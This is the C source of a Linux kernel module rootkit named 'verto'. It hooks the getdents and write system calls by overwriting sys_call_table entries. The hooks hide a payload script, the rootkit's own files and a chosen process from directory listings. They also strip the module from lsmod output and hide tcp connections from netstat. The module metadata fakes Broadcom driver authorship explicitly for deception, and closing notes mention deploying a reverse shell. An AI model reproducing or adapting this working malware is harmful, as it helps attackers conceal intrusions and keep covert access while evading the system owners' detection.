// ====================================================== MODULE DECLERATIONS =======================================================

//                                                     - Neccessary header files -

#include "headers.h"

//                                                        - Module Signing -

// ~ Assists with kernel taint warnings + deception in the event of discovery of the module

#define DRIVER_AUTHOR "Broadcom Corporation"
#define DRIVER_DESCRIPTION "Linux STA NIC driver"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);
MODULE_SUPPORTED_DEVICE("NIC_Device");
MODULE_VERSION("2.5");
MODULE_PARM_DESC(payload_PID, "process ID");

// ==================================================================================================================================


// ======================================================= HOOKING FUNCTIONS  =======================================================

//Assign sytem call table 
unsigned long **SYS_CALL_TABLE;

//                                           - Read/Write Functions For  Page Modifications-

void enablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void disablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;
} 

//struct from getdents man page (fills an array with this stuct data set one for each file in a traversed dir)
struct linux_dirent {
	unsigned long	  d_ino;    // Inode number 
	unsigned long	  d_off;	  // Offset to next linux_dirent 
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width. (max file len is 255 )
}*dirp2 , *dirp3 , *retn;   // dirp = directory pointer -> Utility pointers for struct components






// ======================================================= FILE/GETDENTS HIDING FUNCTIONS  =====================================================

// ------ MALWARE DROP & Verto file hides ------ //

//Hardcoded malware package
char payload[]="fn2187.py"; //Rename to something 'common'
char *payload_PID = NULL; //Modified by module_param (parse in process id to hide), described above by MODULE_PARM_DESC 

// ------------------------------ //

// ------- HIDE ROOTKIT FILE(s) -------- //

//will live in usr/games
char ko_fl[]  = "verto.ko"; //~ namley hide the kernel object file used to insert the kit
char kit_name[] = "verto";
char svr_addr[] = "tcp "; //hide outbound & inbound connections from payload
// ------------------------------ //

//                                                 - Original getdents System Call - 

//getdents syscall from kernel files (aka kallsym)
asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//                                            - Modified/Redirected getdents System Call - 

//Modified version of gedents, hooked from system call table -> pointed here
asmlinkage int gedent_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

    struct linux_dirent *retn, *dirp3; 
    int dirent_obj, remaining_bytes, length;
    //retrive total byte count from gedents call
    dirent_obj = (*original_getdents) (fd, dirp, count);

    //if end of structures 
    if (dirent_obj <= 0){
        return dirent_obj;
    }

    retn = (struct linux_dirent *) kmalloc(dirent_obj, GFP_KERNEL);
    //Copy struct from userspace to our memspace in kernel space
    copy_from_user(retn, dirp, dirent_obj);

    dirp3 = retn; //Holds directory pointer for current dir, used to iterate over
    remaining_bytes = dirent_obj;
  
    while(remaining_bytes > 0){
        length = dirp3->d_reclen; //len of record
        remaining_bytes -= dirp3->d_reclen; //Gives numerical representation of next struct
    
        //Debbugging !REMOVE! ON SUCCESSFUL BUILD & DRY RUN
        //printk(KERN_INFO "remaining_bytes %d   \t File: %s " ,  remaining_bytes , dirp3->d_name );
        

        //checks if current file struct contains one of the files to be hidden (including the process id file)
        if(
            (strcmp( (dirp3->d_name) , payload) == 0) || 
            (strcmp( (dirp3->d_name), ko_fl) == 0)    || 
            (strcmp( (dirp3->d_name), kit_name) == 0) ||
            (strcmp( (dirp3->d_name), payload_PID) == 0)
        ){

            memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, remaining_bytes);
            dirent_obj -= length;
        }

        //Shift pointer to next structure (file)
        dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }

  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, dirent_obj); //Return to user space (using copy_to_user macro)
  kfree(retn); //Free memory used by our function
  
  return dirent_obj; //return modified listing (without hidden files)
}

// ==================================================================================================================================

// ====================================================== WRITE FUNCTIONS  ==========================================================

//un-modified write function
asmlinkage ssize_t(*original_write)(int fd, const void *buf, size_t count);

asmlinkage ssize_t write_hook(int fd, const void *buf, size_t count){
    char * temp_cc;

//                                              - lsmod -  

    if(!strcmp(current->comm, "lsmod")){
        //assign buf    
        temp_cc = (char *) kmalloc(count, GFP_KERNEL);

        //read the buffer of the current write call
        copy_from_user(temp_cc, buf, count); //copy vars from user space

        //determine if its our module that appears in the call
        if(strstr(temp_cc, kit_name) != NULL){ //check for module in buf
            //free mmemory (limited heavily in kernel land)
            kfree(temp_cc);
            
            //return count without calling original write to 'skip' our kit
            return count;
        }
    }

//                                              - netstat -  

    if(strstr(current->comm, "netstat")){
        temp_cc = (char *) kmalloc(count, GFP_KERNEL);

        copy_from_user(temp_cc, buf, count); //copy vars from user space

        if(strstr(temp_cc, svr_addr) != NULL){ //check for module in buf

            //free mmemory (limited heavily in kernel land)
            kfree(temp_cc);
            
            //return count without calling original write to 'skip' our kit
            return count;
        }
    }

    //if it is not our module write it
    return original_write(fd, buf, count);
}




// ==================================================================================================================================

// ==================================================== INSTALIZATION FUNCTION  =====================================================

//TODO rename to encompass other functions
static int __init SetHooks(void) { 
    
    // instalize system call table variable, using call system to get the memory location
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

    // Opens the memory pages to be written
	enablePageWriting((unsigned long )SYS_CALL_TABLE);

    // Replaces Pointer Of Syscall_open on our syscall
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)gedent_hook;

    original_write = (void*)SYS_CALL_TABLE[__NR_write];
    SYS_CALL_TABLE[__NR_write] = (unsigned long*)write_hook;

    //closes pages after hooks
	disablePageWriting((unsigned long )SYS_CALL_TABLE);

	return 0;
}

// ==================================================================================================================================


// =================================================== EXIT FUNCTION  ===============================================================

//TODO rename to encompass other functions
static void __exit CleanupHooks(void) {

	// Clean up our Hooks
	enablePageWriting((unsigned long )SYS_CALL_TABLE);

	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	SYS_CALL_TABLE[__NR_write] = (unsigned long*)original_write;

    disablePageWriting((unsigned long )SYS_CALL_TABLE);
}

// ==================================================================================================================================

// =========================================================== EXECUTE FUNCTIONS  ========================================================

//define the proccess id as a module paramter to take in 

module_param(payload_PID, charp, S_IWUSR); //Writable only, root only

module_init(SetHooks);
module_exit(CleanupHooks);

// =============================================================== NOTES ==============================================================

/*
                                                                - Documentation -
                                                                
        ~> Detailed documentation of the code here can be found in fragmatised form in the code_lib sub folders

        ~> Rootkit will be deployed to /home/usr/Templates
        ~> Reverse shell will be deployed to /usr/games

*/